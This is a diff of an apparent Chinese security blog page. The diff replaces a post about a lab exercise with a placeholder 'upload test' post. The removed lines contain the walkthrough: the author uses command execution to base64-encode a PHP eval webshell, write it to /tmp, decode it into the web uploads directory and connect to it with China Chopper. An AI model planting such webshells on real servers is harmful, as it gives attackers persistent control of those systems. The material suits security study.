@@ -7,30 +7,20 @@
   
   
   
-  <title>记一次base64编码解码绕过限制上传一句话木马 | 墨竹星海’s Bolg</title>
+  <title>虚拟机上传测试 | 墨竹星海’s Bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记一次base64编码解码绕过限制上传一句话木马">
+  <meta name="description" content="虚拟机上传测试">
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次base64编码解码绕过限制上传一句话木马">
-<meta property="og:url" content="http://yoursite.com/2018/11/19/base64 - 副本/index.html">
+<meta property="og:title" content="虚拟机上传测试">
+<meta property="og:url" content="http://yoursite.com/2019/02/17/上传测试/index.html">
 <meta property="og:site_name" content="墨竹星海’s Bolg">
-<meta property="og:description" content="记一次base64编码解码绕过限制上传一句话木马">
+<meta property="og:description" content="虚拟机上传测试">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/8cda06ef40224a2980e912cdc0a789eb.png">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/de2de38940b9076b80517db3aab93f8d.png!">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/93498ad640c21e5380dd0b09ac06291b.png">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/493a48b040b8e507803a8f71bc62130b.png">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/fbe2ed54404e0fd780d925f14f066d4d.png">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/b9f5c41140973f5480b99c9212a80465.png">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/1acf0f4a407a4622809e276a2559c3a6.png">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/a20ab89640ebec9a80b7c70fe93cec8d.png">
-<meta property="og:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/65d7f9b440ebe41c80268d7d2bd125b7.png">
-<meta property="og:updated_time" content="2018-11-19T11:28:32.405Z">
+<meta property="og:updated_time" content="2019-02-17T10:29:48.833Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="记一次base64编码解码绕过限制上传一句话木马">
-<meta name="twitter:description" content="记一次base64编码解码绕过限制上传一句话木马">
-<meta name="twitter:image" content="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/8cda06ef40224a2980e912cdc0a789eb.png">
+<meta name="twitter:title" content="虚拟机上传测试">
+<meta name="twitter:description" content="虚拟机上传测试">
   
   
     <link rel="icon" href="/img/favicon.png">
@@ -212,11 +202,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-base64 - 副本" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-上传测试" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/11/19/base64 - 副本/" class="article-date">
-      <time datetime="2018-11-18T16:00:00.000Z" itemprop="datePublished">2018-11-19</time>
+      <a href="/2019/02/17/上传测试/" class="article-date">
+      <time datetime="2019-02-16T16:00:00.000Z" itemprop="datePublished">2019-02-17</time>
 </a>
 
     </div>
@@ -230,7 +220,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      记一次base64编码解码绕过限制上传一句话木马
+      虚拟机上传测试
     </h1>
   
 
@@ -256,26 +246,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p> 记一次base64编码解码绕过限制上传一句话木马<br><a id="more"></a><br>靶场地址117.41.229.122:8007</p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/8cda06ef40224a2980e912cdc0a789eb.png" alt="markdown"></p>
-<p>第一眼感觉是命令执行或者ssrf。<br>用burp抓包 构造polady</p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/de2de38940b9076b80517db3aab93f8d.png!" alt="markdown"></p>
-<p>可以看到能成功执行linux命令。</p>
-<p>查看用户权限</p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/93498ad640c21e5380dd0b09ac06291b.png" alt="markdown"></p>
-<p>尝试写入一句话木马 发现写不进去。<br>把一句话木马用kali编码成base64 （在线编码编出来的有问题 不知道）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;&lt;?php echo 1;eval(\$_REQUEST[1]); ?&gt;&quot; | base64 </span><br><span class="line">PD9waHAgZWNobyAxO2V2YWwoJF9SRVFVRVNUWzFdKTsgPz4K</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/493a48b040b8e507803a8f71bc62130b.png" alt="markdown"></p>
-<p>查看一下当前文件夹路径。</p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/fbe2ed54404e0fd780d925f14f066d4d.png" alt="markdown"></p>
-<p>把base64编码的一句话以文本的格式写入服务器上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;PD9waHAgZWNobyAxO2V2YWwoJF9SRVFVRVNUWzFdKTsgPz4K&quot;  &gt; /tmp/shell.txt</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/b9f5c41140973f5480b99c9212a80465.png" alt="markdown"></p>
-<p>再把文本中的base64编码解码到网站路径下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d /tmp/shell.txt &gt; /var/www/html/uploads/shell.php</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/1acf0f4a407a4622809e276a2559c3a6.png" alt="markdown"></p>
-<p>访问一下 <a href="http://117.41.229.122:8007/uploads/shell.php" target="_blank" rel="noopener">http://117.41.229.122:8007/uploads/shell.php</a></p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/a20ab89640ebec9a80b7c70fe93cec8d.png" alt="markdown"></p>
-<p>直接用菜刀链接</p>
-<p><img src="http://bmob-cdn-21339.b0.upaiyun.com/2018/11/19/65d7f9b440ebe41c80268d7d2bd125b7.png" alt="markdown"></p>
-<p>最后卡在了提权上 提不动了 放弃挣扎</p>
+        <p>虚拟机上传测试</p>
 
       
     </div>
@@ -284,13 +255,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/11/19/base64 - 副本/">记一次base64编码解码绕过限制上传一句话木马</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/17/上传测试/">虚拟机上传测试</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 墨竹星海 的个人博客">墨竹星海</a></p>
-        <p><span>发布时间:</span>2018年11月19日 - 00时00分</p>
-        <p><span>最后更新:</span>2018年11月19日 - 19时28分</p>
+        <p><span>发布时间:</span>2019年02月17日 - 00时00分</p>
+        <p><span>最后更新:</span>2019年02月17日 - 18时29分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/11/19/base64 - 副本/" title="记一次base64编码解码绕过限制上传一句话木马">http://yoursite.com/2018/11/19/base64 - 副本/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/19/base64 - 副本/　　作者: 墨竹星海" title></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/17/上传测试/" title="虚拟机上传测试">http://yoursite.com/2019/02/17/上传测试/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/02/17/上传测试/　　作者: 墨竹星海" title></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -301,18 +272,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2019/01/01/渗透测试之信息收集整理笔记/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          渗透测试之信息收集整理笔记
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/11/19/base64/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">记一次base64编码解码绕过限制上传一句话木马</div>
+    <a href="/2019/01/01/渗透测试之信息收集整理笔记/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">渗透测试之信息收集整理笔记</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -373,18 +335,16 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/01/01/渗透测试之信息收集整理笔记/" title="上一篇: 渗透测试之信息收集整理笔记">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/11/19/base64/" title="下一篇: 记一次base64编码解码绕过限制上传一句话木马">
+            <a href="/2019/01/01/渗透测试之信息收集整理笔记/" title="下一篇: 渗透测试之信息收集整理笔记">
                 <i class="fa fa-angle-right"></i>
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/渗透测试之信息收集整理笔记/">渗透测试之信息收集整理笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/19/base64 - 副本/">记一次base64编码解码绕过限制上传一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/19/base64/">记一次base64编码解码绕过限制上传一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/18/内网靶机渗透流程步骤/">内网靶机渗透流程步骤</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/14/记一次某院校信息泄露歪打正着的获取到某市的全部学籍信息/">记一次某院校信息泄露歪打正着的获取到某市的全部学籍信息</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/27/Boolean注入攻击/">Boolean注入攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/26/union注入攻击/">union注入攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/新疆师范大学CTF隐写wp整理/">新疆师范大学CTF隐写wp整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/SQL注入基础/">SQL注入基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/13/IIS 6.0 PUT上传漏洞+iis解析漏洞getshell/">IIS 6.0 PUT上传漏洞+iis解析漏洞getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/10/第四节：kali的信息收集之被动扫描（二）/">第四节：kali的信息收集之被动扫描（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/10/一元购买云主机 （ 星外虚拟主机提权 ）/">一元购买云主机 （ 星外虚拟主机提权 ）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/09/第三节：kali的信息收集之被动扫描（一）/">第三节：kali的信息收集之被动扫描（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/04/第二节：kali的配置及常用软件安装/">第二节：kali的配置及常用软件安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/02/第一节：kali+win10双系统安装/">第一节：kali+win10双系统安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/01/使用 Github Pages + Hexo 搭建自己的博客/">使用 Github Pages + Hexo 搭建自己的博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/01/hello-world/">Hello World</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/02/17/上传测试/">虚拟机上传测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/渗透测试之信息收集整理笔记/">渗透测试之信息收集整理笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/19/base64/">记一次base64编码解码绕过限制上传一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/18/内网靶机渗透流程步骤/">内网靶机渗透流程步骤</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/14/记一次某院校信息泄露歪打正着的获取到某市的全部学籍信息/">记一次某院校信息泄露歪打正着的获取到某市的全部学籍信息</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/27/Boolean注入攻击/">Boolean注入攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/26/union注入攻击/">union注入攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/新疆师范大学CTF隐写wp整理/">新疆师范大学CTF隐写wp整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/SQL注入基础/">SQL注入基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/13/IIS 6.0 PUT上传漏洞+iis解析漏洞getshell/">IIS 6.0 PUT上传漏洞+iis解析漏洞getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/10/第四节：kali的信息收集之被动扫描（二）/">第四节：kali的信息收集之被动扫描（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/10/一元购买云主机 （ 星外虚拟主机提权 ）/">一元购买云主机 （ 星外虚拟主机提权 ）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/09/第三节：kali的信息收集之被动扫描（一）/">第三节：kali的信息收集之被动扫描（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/04/第二节：kali的配置及常用软件安装/">第二节：kali的配置及常用软件安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/02/第一节：kali+win10双系统安装/">第一节：kali+win10双系统安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/01/使用 Github Pages + Hexo 搭建自己的博客/">使用 Github Pages + Hexo 搭建自己的博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/01/hello-world/">Hello World</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
